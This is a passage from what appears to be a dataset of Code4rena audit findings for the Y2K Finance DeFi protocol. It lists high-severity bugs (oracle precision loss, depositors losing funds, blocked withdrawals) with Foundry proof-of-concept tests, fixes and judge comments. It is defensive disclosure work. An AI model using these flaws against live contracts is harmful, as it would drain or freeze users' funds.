priceFeed1.latestRoundData();\n\n            require(price1 > 0, \"Chainlink price <= 0\");\n            require(\n                answeredInRound1 >= roundID1,\n                \"RoundID from Oracle is outdated!\"\n            );\n            require(timeStamp1 != 0, \"Timestamp == 0 !\");\n\n            return price1;\n        }\n\n        /* solhint-disbable-next-line func-name-mixedcase */\n        /** @notice Lookup second oracle price\n          * @return price Current second oracle price\n          */ \n        function getOracle2_Price() public view returns (int256 price) {\n            (\n                uint80 roundID2,\n                int256 price2,\n                ,\n                uint256 timeStamp2,\n                uint80 answeredInRound2\n            ) = priceFeed2.latestRoundData();\n\n            require(price2 > 0, \"Chainlink price <= 0\");\n            require(\n                answeredInRound2 >= roundID2,\n                \"RoundID from Oracle is outdated!\"\n            );\n            require(timeStamp2 != 0, \"Timestamp == 0 !\");\n\n            return price2;\n        }\n        \n        function latestRoundData2()\n            public\n            view\n            returns (\n                uint80 roundID,\n                int256 nowPrice,\n                uint256 startedAt,\n                uint256 timeStamp,\n                uint80 answeredInRound\n            )\n        {\n            (\n                uint80 roundID1,\n                int256 price1,\n                uint256 startedAt1,\n                uint256 timeStamp1,\n                uint80 answeredInRound1\n            ) = priceFeed1.latestRoundData();\n\n            price1 = scalePriceTo18(price1, priceFeed1.decimals());\n\n            int256 price2 = scalePriceTo18(getOracle2_Price(), priceFeed1.decimals());\n\n\n            return (\n                roundID1,\n                price1  * 1e18 / price2, \n                startedAt1,\n                timeStamp1,\n                answeredInRound1\n            );\n        }\n\n\n    function scalePriceTo18(int256 _price, uint8 _priceDecimals)\n            internal\n            pure\n            returns (int256)\n        {\n            if (_priceDecimals < 18) {\n                return _price * int256(10 ** uint256(18 - _priceDecimals));\n            } else if (_priceDecimals > 18) {\n                return _price * int256(10 ** uint256(_priceDecimals - 18));\n            }\n            return _price;\n        }\n    } \n\n\n\n\n    contract TestOracles is Test {\n        address WETH = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;\n\n        address tokenFRAX = 0x17FC002b466eEc40DaE837Fc4bE5c67993ddBd6F;\n        address tokenMIM = 0xFEa7a6a0B346362BF88A9e4A88416B77a57D6c2A;\n        address tokenFEI = 0x4A717522566C7A09FD2774cceDC5A8c43C5F9FD2;\n        address tokenUSDC = 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8;\n        address tokenDAI = 0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1;\n        address tokenSTETH = 0xEfa0dB536d2c8089685630fafe88CF7805966FC3;\n\n        address oracleFRAX = 0x0809E3d38d1B4214958faf06D8b1B1a2b73f2ab8;\n        address oracleMIM = 0x87121F6c9A9F6E90E59591E4Cf4804873f54A95b;\n        address oracleFEI = 0x7c4720086E6feb755dab542c46DE4f728E88304d;\n        address oracleUSDC = 0x50834F3163758fcC1Df9973b6e91f0F0F0434aD3;\n        address oracleDAI = 0xc5C8E77B397E531B8EC06BFb0048328B30E9eCfB;\n        address oracleSTETH = 0x07C5b924399cc23c24a95c8743DE4006a32b7f2a;\n        address oracleETH = 0x639Fe6ab55C921f74e7fac1ee960C0B6293ba612;\n        address btcEthOracle = 0xc5a90A6d7e4Af242dA238FFe279e9f2BA0c64B2e;\n\n        PegOracle pegOracle = new PegOracle(oracleSTETH, oracleETH);\n        PegOracle pegOracle2 = new PegOracle(oracleFRAX, oracleFEI);\n        PegOracle pegOracle3 = new PegOracle(oracleDAI, oracleFEI);\n\n        function setUp() public {}\n\n        function convertBasedOnContractsLogic(int256 price, uint8 oracleDecimals) public returns(int256 newPrice){\n            uint256 decimals = 10**(18- oracleDecimals );\n            int256 newPrice = price * int256(decimals);\n            return newPrice;\n        }\n\n        function testOraclePrices() public {\n            (, int256 var1 ,,,) = pegOracle.latestRoundData();\n            emit log_int(convertBasedOnContractsLogic(var1, pegOracle.decimals()));\n\n            (, int256 var2 ,,,) = pegOracle.latestRoundData2();\n            emit log_int(var2);\n\n            (, int256 var3 ,,,) = pegOracle2.latestRoundData();\n            emit log_int(convertBasedOnContractsLogic(var3, pegOracle2.decimals()));\n\n            (, int256 var4 ,,,) = pegOracle2.latestRoundData2();\n            emit log_int(var4);\n\n\n            (, int256 var5 ,,,) = pegOracle3.latestRoundData();\n            emit log_int(convertBasedOnContractsLogic(var5, pegOracle3.decimals()));\n\n            (, int256 var6 ,,,) = pegOracle3.latestRoundData2();\n            emit log_int(var6);\n        }\n\n    }\n\nHere is the output after running the with: ` forge test --fork-url https://arb1.arbitrum.io/rpc -vv  `:\n990500000000000000\n990544616614592905\n\n996300000000000000\n1003669952945847834\n\n996000000000000000\n1003940775578783463\n\n### Recommended Mitigation Steps\n\nSince the 2 assets are required to having the same amount of decimals a formula that transforms the relative price to 1e18 could be:\n`x * 1e18 / y` .\n\nAn example that Chainlink implements, that includes a `scalePrice` function, in order to find a different price denominator could be found [here](https://docs.chain.link/docs/get-the-latest-price/#getting-a-different-price-denomination).\n\n**[MiguelBits (Y2K Finance) acknowledged](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/323)** \n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/323#issuecomment-1280944745):**\n > Agree with the issue; the precision loss may be the decisive factor between whether a depeg is ruled to have happened. Since the core functionality and user funds are at stake, the high severity is appropriate here.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the project implementing a price oracle in order to get the relative price between the pegged asset and the price of the original asset (example: stETH to ETH). The code snippet from the PegOracle.sol function performs calculations to fetch the ratio at any time, however, due to the fact that the first multiplication is first divided by 1e6 and then re-multiplied, it leads to loss of precision, making the relative price between the assets incorrect. A proof of concept was included to illustrate the issue for various oracle pairs. \n\nThe recommended mitigation step is to use a formula that transforms the relative price to 1e18, such as `x * 1e18 / y`. An example that Chainlink implements, that includes a scalePrice function, in order to find a different price denominator, was included in the report. Manual review was used as the tool for this bug report.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Y2k Finance",
      "source_link": "https://code4rena.com/reports/2022-09-y2k-finance",
      "github_link": "https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/323",
      "tags": [],
      "finders": [
        "0xPanas  Lambda",
        "0xDecorativePineapple"
      ]
    },
    {
      "id": "5776",
      "title": "[H-04] Users who deposit in one vault can lose all deposits and receive nothing when counterparty vault has no deposits",
      "impact": "HIGH",
      "content": "\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/main/src/Controller.sol#L148-L192>\n\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/main/src/Vault.sol#L350-L352>\n\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/main/src/Vault.sol#L203-L234>\n\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/main/src/Vault.sol#L378-L426>\n\n### Impact\n\nFor a market, if users only deposit in the hedge vault or only deposit in the risk vault but not in both, then these users will lose their deposits and receive nothing when they call the following `withdraw` function after the depeg event occurs.\n\nIf the vault that has deposits is called Vault A, and the counterparty vault that has no deposit is called Vault B, then:\n\n*   As shown by the `triggerDepeg` function below, when executing `insrVault.sendTokens(epochEnd, address(riskVault))` and `riskVault.sendTokens(epochEnd, address(insrVault))`, the deposits of Vault A are transferred to Vault B but nothing is transferred to Vault A since Vault B has no deposit;\n*   When `triggerDepeg` executes `insrVault.setClaimTVL(epochEnd, riskVault.idFinalTVL(epochEnd))` and `riskVault.setClaimTVL(epochEnd, insrVault.idFinalTVL(epochEnd))`, Vault B's `idClaimTVL[id]` is set to Vault A's `idFinalTVL(epochEnd))` but Vault A's `idClaimTVL[id]` is set to 0 because Vault B's `idFinalTVL(epochEnd)` is 0.\n\nBecause of these, calling the `beforeWithdraw` function below will return a 0 `entitledAmount`, and calling `withdraw` then transfers that 0 amount to the user who has deposited. As a result, these users' deposits are transferred to the counterparty vault, and they receive nothing at all.\n\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/main/src/Controller.sol#L148-L192>\n\n```solidity\n    function triggerDepeg(uint256 marketIndex, uint256 epochEnd)\n        public\n        isDisaster(marketIndex, epochEnd)\n    {\n        address[] memory vaultsAddress = vaultFactory.getVaults(marketIndex);\n        Vault insrVault = Vault(vaultsAddress[0]);\n        Vault riskVault = Vault(vaultsAddress[1]);\n\n        //require this function cannot be called twice in the same epoch for the same vault\n        if(insrVault.idFinalTVL(epochEnd) != 0)\n            revert NotZeroTVL();\n        if(riskVault.idFinalTVL(epochEnd) != 0) \n            revert NotZeroTVL();\n\n        insrVault.endEpoch(epochEnd, true);\n        riskVault.endEpoch(epochEnd, true);\n\n        insrVault.setClaimTVL(epochEnd, riskVault.idFinalTVL(epochEnd));\n        riskVault.setClaimTVL(epochEnd, insrVault.idFinalTVL(epochEnd));\n\n        insrVault.sendTokens(epochEnd, address(riskVault));\n        riskVault.sendTokens(epochEnd, address(insrVault));\n\n        VaultTVL memory tvl = VaultTVL(\n            riskVault.idClaimTVL(epochEnd),\n            insrVault.idClaimTVL(epochEnd),\n            riskVault.idFinalTVL(epochEnd),\n            insrVault.idFinalTVL(epochEnd)\n        );\n\n        emit DepegInsurance(\n            keccak256(\n                abi.encodePacked(\n                    marketIndex,\n                    insrVault.idEpochBegin(epochEnd),\n                    epochEnd\n                )\n            ),\n            tvl,\n            true,\n            epochEnd,\n            block.timestamp,\n            getLatestPrice(insrVault.tokenInsured())\n        );\n    }\n```\n\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/main/src/Vault.sol#L350-L352>\n\n```solidity\n    function setClaimTVL(uint256 id, uint256 claimTVL) public onlyController {\n        idClaimTVL[id] = claimTVL;\n    }\n```\n\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/main/src/Vault.sol#L203-L234>\n\n```solidity\n    function withdraw(\n        uint256 id,\n        uint256 assets,\n        address receiver,\n        address owner\n    )\n        external\n        override\n        epochHasEnded(id)\n        marketExists(id)\n        returns (uint256 shares)\n    {\n        if(\n            msg.sender != owner &&\n            isApprovedForAll(owner, receiver) == false)\n            revert OwnerDidNotAuthorize(msg.sender, owner);\n\n        shares = previewWithdraw(id, assets); // No need to check for rounding error, previewWithdraw rounds up.\n\n        uint256 entitledShares = beforeWithdraw(id, shares);\n        _burn(owner, id, shares);\n\n        //Taking fee from the amount\n        uint256 feeValue = calculateWithdrawalFeeValue(entitledShares, id);\n        entitledShares = entitledShares - feeValue;\n        asset.transfer(treasury, feeValue);\n\n        emit Withdraw(msg.sender, receiver, owner, id, assets, entitledShares);\n        asset.transfer(receiver, entitledShares);\n\n        return entitledShares;\n    }\n```\n\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/main/src/Vault.sol#L378-L426>\n\n```solidity\n    function beforeWithdraw(uint256 id, uint256 amount)\n        public\n        view\n        returns (uint256 entitledAmount)\n    {\n        // in case the risk wins aka no depeg event\n        // risk users can withdraw the hedge (that is paid by the hedge buyers) and risk; withdraw = (risk + hedge)\n        // hedge pay for each hedge seller = ( risk / tvl before the hedge payouts ) * tvl in hedge pool\n        // in case there is a depeg event, the risk users can only withdraw the hedge\n        if (\n            keccak256(abi.encodePacked(symbol)) ==\n            keccak256(abi.encodePacked(\"rY2K\"))\n        ) {\n            if (!idDepegged[id]) {\n                //depeg event did not happen\n                /*\n                entitledAmount =\n                    (amount / idFinalTVL[id]) *\n                    idClaimTVL[id] +\n                    amount;\n                */\n                entitledAmount =\n                    amount.divWadDown(idFinalTVL[id]).mulDivDown(\n                        idClaimTVL[id],\n                        1 ether\n                    ) +\n                    amount;\n            } else {\n                //depeg event did happen\n                entitledAmount = amount.divWadDown(idFinalTVL[id]).mulDivDown(\n                    idClaimTVL[id],\n                    1 ether\n                );\n            }\n        }\n        // in case the hedge wins aka depegging\n        // hedge users pay the hedge to risk users anyway,\n        // hedge guy can withdraw risk (that is transfered from the risk pool),\n        // withdraw = % tvl that hedge buyer owns\n        // otherwise hedge users cannot withdraw any Eth\n        else {\n            entitledAmount = amount.divWadDown(idFinalTVL[id]).mulDivDown(\n                idClaimTVL[id],\n                1 ether\n            );\n        }\n\n        return entitledAmount;\n    }\n```\n\n### Proof of Concept\n\nPlease append the following tests in `test\\AssertTest.t.sol`. These tests will pass to demonstrate the described scenarios.\n\n```solidity\n    function testWithdrawFromRiskAfterDepegWhenThereIsNoCounterparty() public {\n        vm.deal(chad, AMOUNT * CHAD_MULTIPLIER);\n\n        vm.startPrank(admin);\n        FakeOracle fakeOracle = new FakeOracle(oracleFRAX, STRIKE_PRICE_FAKE_ORACLE);\n        vaultFactory.createNewMarket(FEE, tokenFRAX, DEPEG_AAA, beginEpoch, endEpoch, address(fakeOracle), \"y2kFRAX_99*\");\n        vm.stopPrank();\n\n        address hedge = vaultFactory.getVaults(1)[0];\n        address risk = vaultFactory.getVaults(1)[1];\n        \n        Vault vHedge = Vault(hedge);\n        Vault vRisk = Vault(risk);\n\n        // chad deposits in risk vault, and no one deposits in hedge vault\n        vm.startPrank(chad);\n        ERC20(WETH).approve(risk, AMOUNT * CHAD_MULTIPLIER);\n        vRisk.depositETH{value: AMOUNT * CHAD_MULTIPLIER}(endEpoch, chad);\n\n        assertTrue(vRisk.balanceOf(chad,endEpoch) == (AMOUNT * CHAD_MULTIPLIER));\n        vm.stopPrank();\n\n        vm.warp(beginEpoch + 10 days);\n\n        // depeg occurs\n        controller.triggerDepeg(SINGLE_MARKET_INDEX, endEpoch);\n\n        vm.startPrank(chad);\n\n        // chad withdraws from risk vault\n        uint256 assets = vRisk.balanceOf(chad,endEpoch);\n        vRisk.withdraw(endEpoch, assets, chad, chad);\n\n        assertTrue(vRisk.balanceOf(chad,endEpoch) == NULL_BALANCE);\n        uint256 entitledShares = vRisk.beforeWithdraw(endEpoch, assets);\n        assertTrue(entitledShares - vRisk.calculateWithdrawalFeeValue(entitledShares,endEpoch) == ERC20(WETH).balanceOf(chad));\n\n        // chad receives nothing\n        assertEq(entitledShares, 0);\n        assertEq(ERC20(WETH).balanceOf(chad), 0);\n\n        vm.stopPrank();\n    }\n```\n\n```solidity\n    function testWithdrawFromHedgeAfterDepegWhenThereIsNoCounterparty() public {\n        vm.deal(alice, AMOUNT);\n\n        vm.startPrank(admin);\n        FakeOracle fakeOracle = new FakeOracle(oracleFRAX, STRIKE_PRICE_FAKE_ORACLE);\n        vaultFactory.createNewMarket(FEE, tokenFRAX, DEPEG_AAA, beginEpoch, endEpoch, address(fakeOracle), \"y2kFRAX_99*\");\n        vm.stopPrank();\n\n        address hedge = vaultFactory.getVaults(1)[0];\n        address risk = vaultFactory.getVaults(1)[1];\n        \n        Vault vHedge = Vault(hedge);\n        Vault vRisk = Vault(risk);\n\n        // alice deposits in hedge vault, and no one deposits in risk vault\n        vm.startPrank(alice);\n        ERC20(WETH).approve(hedge, AMOUNT);\n        vHedge.depositETH{value: AMOUNT}(endEpoch, alice);\n\n        assertTrue(vHedge.balanceOf(alice,endEpoch) == (AMOUNT));\n        vm.stopPrank();\n\n        vm.warp(beginEpoch + 10 days);\n\n        // depeg occurs\n        controller.triggerDepeg(SINGLE_MARKET_INDEX, endEpoch);\n\n        vm.startPrank(alice);\n\n        // alice withdraws from hedge vault\n        uint256 assets = vHedge.balanceOf(alice,endEpoch);\n        vHedge.withdraw(endEpoch, assets, alice, alice);\n\n        assertTrue(vHedge.balanceOf(alice,endEpoch) == NULL_BALANCE);\n        uint256 entitledShares = vHedge.beforeWithdraw(endEpoch, assets);\n        assertTrue(entitledShares - vHedge.calculateWithdrawalFeeValue(entitledShares,endEpoch) == ERC20(WETH).balanceOf(alice));\n        \n        // alice receives nothing\n        assertEq(entitledShares, 0);\n        assertEq(ERC20(WETH).balanceOf(alice), 0);\n\n        vm.stopPrank();\n    }\n```\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\nWhen users only deposit in one vault, and no one deposits in the counterparty vault, the insurance practice of hedging and risking actually does not exist. In this situation, after the epoch is started, the users, who have deposited, should be allowed to withdraw their full deposit amounts.\n\n**[3xHarry (Y2K Finance) confirmed](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/409)**\n\n\n\n***\n\n",
      "summary": "\nA bug has been reported in the 2022-09-y2k-finance project. The bug occurs when users deposit in only one vault and no one deposits in the counterparty vault. When the depeg event occurs, users who have deposited in the vault with deposits receive nothing when they call the withdraw function. This bug can be demonstrated using two tests that have been provided and can be appended to the AssertTest.t.sol file. \n\nThe bug is caused by the code in the Controller.sol, Vault.sol, and AssertTest.t.sol files. In the Controller.sol file, when the triggerDepeg function is executed, the deposits of the vault with deposits are transferred to the counterparty vault but nothing is transferred to the vault with deposits since the counterparty vault has no deposit. When the setClaimTVL function in the Vault.sol file is executed, the counterparty vault's idClaimTVL is set to the vault with deposits' idFinalTVL but the vault with deposits' idClaimTVL is set to 0 because the counterparty vault's idFinalTVL is 0. When the beforeWithdraw function in the Vault.sol file is executed, it returns a 0 entitledAmount, and when the withdraw function is called, it transfers that 0 amount to the user who has deposited. As a result, these users' deposits are transferred to the counterparty vault, and they receive nothing at all.\n\nThe recommended mitigation steps for this bug are that when users only deposit in one vault, and no one deposits in the counterparty vault, the insurance practice of hedging and risking actually does not exist. In this situation, after the epoch is started, the users, who have deposited, should be allowed to withdraw their full deposit amounts.",
      "quality_score": 5,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Y2k Finance",
      "source_link": "https://code4rena.com/reports/2022-09-y2k-finance",
      "github_link": "https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/312",
      "tags": [
        "Vault"
      ],
      "finders": [
        "carrotsmuggler",
        "0x52",
        "unforgiven",
        "rbserver",
        "Jeiwan",
        "ladboy233",
        "Lambda",
        "Tointer",
        "imare",
        "wagmi",
        "Ch_301"
      ]
    },
    {
      "id": "5775",
      "title": "[H-03] A design flaw in the case of using 2 oracles (aka PegOracle)",
      "impact": "HIGH",
      "content": "\nA design flaw in the case of using 2 oracles (aka PegOracle).\n\n### Proof of Concept\n\nChainlink provides price feeds denominated either in ETH or USD. But some assets don't have canonical value accessed on-chain. An example would be BTC and it's many on-chain forms like renBTC, hitBTC, WBTC, aBTC etc... For example in the case of a market on renBTC depegging from BTC value, probably a pair like renBTC/WBTC would be used (leveraging PegOracle). But even if renBTC perfectly maintains it's value to BTC, the depeg event can be triggered when WBTC significantly depreciates or appreciates against BTC value. This depeg event will be theoretically unsound since renBTC behaved as expected. The flaw comes from PegOracle because it treats both assets symmetrically.\n\nThis is also true for ETH pairs like stETH/aETH etc.. or stablecoin pairs like FRAX/MIM etc..\nOf course, it should never be used like this because Chainlink provides price feeds with respect to true ETH and USD values but we have found that test files include PegOracle for stablecoin pairs.\n\n### Recommended Mitigation Steps\n\nSupport markets only for assets that have access to an oracle with price against canonical value x/ETH or x/USD.\n\n**[MiguelBits (Y2K Finance) disputed](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/283)** \n\n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/283#issuecomment-1281801755):**\n > From what I understand, the warden is arguing that if the underlying asset is itself a pegged asset, then it wouldn't be a very good measure against the \"canonical price\". \n> \n> Eg. `MIM` (pegged) -> `USDC` (underlying), and USDC de-pegs, even though MIM is close to `$1`, the protocol would recognise this as a de-peg event.\n> \n> I agree with the issue, but disagree with the severity. The choice of the underlying token is quite obviously important; I think the sponsor can attest to this.\n> \n> @3xHarry thoughts? Perhaps low severity is more appropriate because it isn't a technical vulnerability per-se, more of the choice of underlying to be used.\n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/283#issuecomment-1281879652):**\n > Keeping high severity even though there are a couple of prerequisites:\n> - the protocol uses a poor underlying token (Eg. USDT that has de-pegged to `$0.97` before)\n> - underlying token de-pegs substantially to inaccurately trigger (or not trigger) a de-peg event\n> \n> I classify this as indirect loss of assets from a valid attack path that does not have hand-wavy hypotheticals\n> > 3 — High: Assets can be stolen/lost/compromised directly (or indirectly if there is a valid attack path that does not have hand-wavy hypotheticals).\n> \n\n\n\n***\n\n",
      "summary": "\nA design flaw has been discovered in the case of using two oracles, known as PegOracle, when it comes to providing price feeds denominated in ETH or USD. This flaw comes from the fact that PegOracle treats both assets symmetrically, even when one of the assets behaves as expected. This can create an issue in the case of a market on renBTC depegging from BTC value, as the depeg event can be triggered when WBTC significantly depreciates or appreciates against BTC value, even if renBTC perfectly maintains its value to BTC. The same is true for ETH pairs like stETH/aETH and stablecoin pairs like FRAX/MIM. To avoid this, it is recommended to only support markets for assets that have access to an oracle with price against canonical value x/ETH or x/USD.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Y2k Finance",
      "source_link": "https://code4rena.com/reports/2022-09-y2k-finance",
      "github_link": "https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/283",
      "tags": [],
      "finders": [
        "PwnPatrol"
      ]
    },
    {
      "id": "5774",
      "title": "[H-02] End epoch cannot be triggered preventing winners to withdraw",
      "impact": "HIGH",
      "content": "\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Controller.sol#L198>\n\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Controller.sol#L246>\n\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Controller.sol#L261>\n\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Controller.sol#L277-L286>\n\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Vault.sol#L203>\n\n### Impact\n\nAt the end of an epoch, the [triggerEndEpoch(...)](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Controller.sol#L198) is called to trigger 'epoch end without depeg event', making risk users the winners and entitling them to [withdraw](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Vault.sol#L203) (risk + hedge) from the vault.\nIn the case of the Arbitrum sequencer going down or restarting, there is a [grace period of one hour](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Controller.sol#L285) before the [getLatestPrice()](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Controller.sol#L261) returns to execute without reverting. This means that the [triggerEndEpoch(...)](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Controller.sol#L198) cannot complete during this time, because it calls the [getLatestPrice()](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Controller.sol#L261).\n\nMaking this high-priority because unless the [triggerEndEpoch(...)](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Controller.sol#L198) completes:\n\n*   winners cannot [withdraw](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Vault.sol#L203) althought the epoch is over;\n*   during this time the strike price might be reached causing a depeg event at all effects turning the table for the winners;\n*   the [getLatestPrice()](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Controller.sol#L261) is not functional to the completion of the [triggerEndEpoch(...)](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Controller.sol#L198), nor to the [withdraw](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Vault.sol#L203), but only informative used to initialize the event object emitted [at the very end of the triggerEndEpoch function](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Controller.sol#L246).\n\nFirst two points each constitute independent justification, third point reinforces the first 2 points.\n\n### Proof of Concept\n\n#### triggerEndEpoch reverts if arbiter down or restarted less than eq GRACE_PERIOD_TIME ago (1hr)\n\nFile: [Controller.sol:L246](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Controller.sol#L246)\n\nRevert if getLatestPrice reverts.\n\n```solidity\nfunction triggerEndEpoch(uint256 marketIndex, uint256 epochEnd) public {\n    \n    < ... omitted ... >\n\n    emit DepegInsurance(\n        keccak256(\n            abi.encodePacked(\n                marketIndex,\n                insrVault.idEpochBegin(epochEnd),\n                epochEnd\n            )\n        ),\n        tvl,\n        false,\n        epochEnd,\n        block.timestamp,\n        getLatestPrice(insrVault.tokenInsured()) // @audit getLatestPrice reverts while sequencer unavailable or during grace period\n    );\n}\n```\n\nFile: [Controller.sol:L277-L286](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Controller.sol#L277-L286)\n\nRevert if sequencer down or grace period after restart not over.\n\n```solidity\nfunction getLatestPrice(address _token)\n    public\n    view\n    returns (int256 nowPrice)\n{\n    < ... omitted ... >\n\n    bool isSequencerUp = answer == 0;\n    if (!isSequencerUp) {\n        revert SequencerDown();\n    }\n\n    // Make sure the grace period has passed after the sequencer is back up.\n    uint256 timeSinceUp = block.timestamp - startedAt;\n    if (timeSinceUp <= GRACE_PERIOD_TIME) { // @audit 1 hour\n        revert GracePeriodNotOver();\n    }\n\n    < ... omitted ... >\n}\n```\n\n#### withdraw fails if triggerEndEpoch did not execute successfully\n\nFile: [Vault.sol:L203](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Vault.sol#L203)\n\nCan execute if block.timestamp > epochEnd, but fails if trigger did not execute. Winners cannot withdraw.\n\n```solidity\nfunction withdraw(\n    uint256 id,\n    uint256 assets,\n    address receiver,\n    address owner\n)\n    external\n    override\n    epochHasEnded(id) // @audit same as require((block.timestamp > id) || idDepegged[id]), hence independent from triggers.\n    marketExists(id)\n    returns (uint256 shares)\n{\n    < ... omitted ... >\n\n    uint256 entitledShares = beforeWithdraw(id, shares); // @audit ratio is idClaimTVL[id]/ifFinalTVL[id], hence zero unless triggers executed\n    \n    < ... omitted ... >\n\n    emit Withdraw(msg.sender, receiver, owner, id, assets, entitledShares);\n    asset.transfer(receiver, entitledShares);\n\n    return entitledShares;\n}\n```\n\n### Recommended Mitigation Steps\n\nThe latest price is retrieved at the very end of the [triggerEndEpoch(...)](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Controller.sol#L198) for the only purpose of initializing the DepegInsurance event.\nSince it is used for informational purpose (logging / offchain logging) and not for functional purpose to the [triggerEndEpoch(...)](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Controller.sol#L198) execution, it can be relaxed.\n\nDepending on how the event is used, when `getLatestPrice()` is called for informative/logging purpose only, there could be few alternatives:\n\n*   log a 0 when SequencerDown or GRACE_PERIOD_TIME not passed\n*   log a 0 when SequencerDown and ignore GRACE_PERIOD_TIME\n\nOnce events are logged off-chain, some post processing may be used to correct/update the values with accurate data.\n\n**[3xHarry (Y2K Finance) commented](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/278#issuecomment-1254787198):**\n > Great catch!\n\n**[MiguelBits (Y2K Finance) confirmed and commented](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/278#issuecomment-1256542257):**\n > Fixed this by changing triggerEndEpoch, \n> ```\n> AggregatorV3Interface priceFeed = AggregatorV3Interface(\n>             vaultFactory.tokenToOracle(insrVault.tokenInsured())\n>         );\n>         (\n>             ,  \n>             int256 price,\n>             ,\n>             ,\n>             \n>         ) = priceFeed.latestRoundData();\n> \n>         emit DepegInsurance(\n>             keccak256(\n>                 abi.encodePacked(\n>                     marketIndex,\n>                     insrVault.idEpochBegin(epochEnd),\n>                     epochEnd\n>                 )\n>             ),\n>             tvl,\n>             true,\n>             epochEnd,\n>             block.timestamp,\n>             price\n>         );\n> ```\n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/278#issuecomment-1281790980):**\n > Agree with the points raised by the warden, especially on how `getLatestPrice()` is merely for informational purposes in the event emission.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an issue with the triggerEndEpoch function in the code-423n4/2022-09-y2k-finance repository. This function is called to trigger an 'epoch end without depeg event', making risk users the winners and entitling them to withdraw (risk + hedge) from the vault. The problem is that if the Arbitrum sequencer goes down or restarts, there is a grace period of one hour before the getLatestPrice() function returns, which means that the triggerEndEpoch() cannot complete during this time and the winners cannot withdraw. \n\nThe proof of concept shows that the triggerEndEpoch() will revert if the getLatestPrice() reverts and if the sequencer is down or the grace period after restart has not yet passed. It also shows that the withdraw() function will fail if the triggerEndEpoch() did not execute successfully. \n\nThe recommended mitigation steps are to relax the getLatestPrice() function when it is used for informational purposes. Depending on how the event is used, the values can be logged as 0 when the sequencer is down or the grace period is not over, and post processing can be used to update the values with accurate data.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Y2k Finance",
      "source_link": "https://code4rena.com/reports/2022-09-y2k-finance",
      "github_link": "https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/278",
      "tags": [],
      "finders": [
        "eierina"
      ]
    },
    {
      "id": "5773",
      "title": "[H-01] Incorrect handling of `pricefeed.decimals()`",
      "impact": "HIGH",
